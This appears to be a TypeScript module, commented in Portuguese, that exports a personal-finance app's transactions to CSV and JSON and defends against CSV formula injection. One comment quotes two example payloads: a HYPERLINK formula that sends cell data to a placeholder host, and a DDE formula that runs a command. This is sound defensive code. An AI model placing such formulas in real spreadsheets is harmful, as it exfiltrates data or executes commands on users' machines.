import type { FinanceTransaction } from '@/lib/types';

/**
 * Exportação de lançamentos.
 *
 * CSV é o formato do contador; JSON é o do integrador (e o único que preserva
 * centavos como string sem ambiguidade). O CSV ganha o separador `;` porque o
 * Excel em português só reconhece `;` como separador de colunas — com vírgula,
 * a planilha inteira cai numa coluna só. Por isso a primeira linha é
 * `sep=;`, que o Excel respeita e os outros leitores ignoram.
 */

export type ExportFormat = 'csv' | 'json';

export type ExportRow = {
  date: string;
  competenceDate: string;
  description: string;
  category: string;
  account: string;
  type: string;
  status: string;
  /** Centavos como string, com sinal: nunca float. */
  amountCents: string;
  dueDate: string;
  paidAt: string;
};

/** `true` quando o campo precisa de aspas (separador, quebra de linha ou aspas). */
function needsQuotes(value: string, separator: string): boolean {
  return value.includes(separator) || value.includes('"') || /[\n\r]/.test(value);
}

/**
 * Neutraliza fórmula de planilha (CSV injection).
 *
 * Uma descrição como `=HYPERLINK("http://malicioso/?d="&A2,"clique")` ou
 * `=cmd|'/c calc'!A1` vira **fórmula executada** quando o arquivo abre no Excel,
 * no LibreOffice ou no Google Sheets — o texto do lançamento é entrada do
 * usuário, então ele controla esse conteúdo. Prefixar com `'` força a célula a
 * ser texto e a fórmula aparece literalmente, sem executar.
 *
 * Também cobrimos TAB e CR: `=1+1` disfarçado de `\t=1+1` é aceito por alguns
 * parsers.
 */
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

export function toCsv(rows: ExportRow[], separator = ';'): string {
  const header = [
    'Data',
    'Competência',
    'Descrição',
    'Categoria',
    'Conta',
    'Tipo',
    'Situação',
    'Valor (centavos)',
    'Vencimento',
    'Pago em',
  ];

  const fields = (row: ExportRow): string[] => [
    row.date,
    row.competenceDate,
    row.description,
    row.category,
    row.account,
    row.type,
    row.status,
    row.amountCents,
    row.dueDate,
    row.paidAt,
  ];

  const escape = (value: string): string => {
    const safe = neutralizeFormula(value);
    return needsQuotes(safe, separator) ? `"${safe.replace(/"/g, '""')}"` : safe;
  };

  // `sep=` é uma diretiva do Excel; leitores de CSV a tratam como linha válida
  // e ela é descartada junto com o cabeçalho por quem lê por posição.
  return [
    `sep=${separator}`,
    header.join(separator),
    ...rows.map((row) => fields(row).map(escape).join(separator)),
  ].join('\r\n');
}

export function toJson(rows: ExportRow[]): string {
  // Objeto com versão: quem consome sabe o que está lendo sem adivinhar.
  return JSON.stringify(
    {
      exportedAt: new Date().toISOString(),
      schema: 'meufinanceiro.transactions.v1',
      count: rows.length,
      rows,
    },
    null,
    2
  );
}

export function exportRows(
  transactions: FinanceTransaction[],
  resolveCategory: (id: string | null) => string,
  resolveAccount: (id: string) => string
): ExportRow[] {
  return transactions.map((transaction) => ({
    date: transaction.date.slice(0, 10),
    competenceDate: (transaction.competenceDate ?? transaction.date).slice(0, 10),
    description: transaction.description,
    category: transaction.categoryId ? resolveCategory(transaction.categoryId) : '',
    account: resolveAccount(transaction.accountId),
    type: transaction.type,
    status: transaction.status ?? 'paid',
    amountCents: transaction.amountCents,
    dueDate: transaction.dueDate?.slice(0, 10) ?? '',
    paidAt: transaction.paidAt?.slice(0, 10) ?? '',
  }));
}

export function fileNameFor(format: ExportFormat, scope: string): string {
  return `lancamentos-${scope}.${format}`;
}

export function mimeFor(format: ExportFormat): string {
  return format === 'csv' ? 'text/csv;charset=utf-8' : 'application/json;charset=utf-8';
}
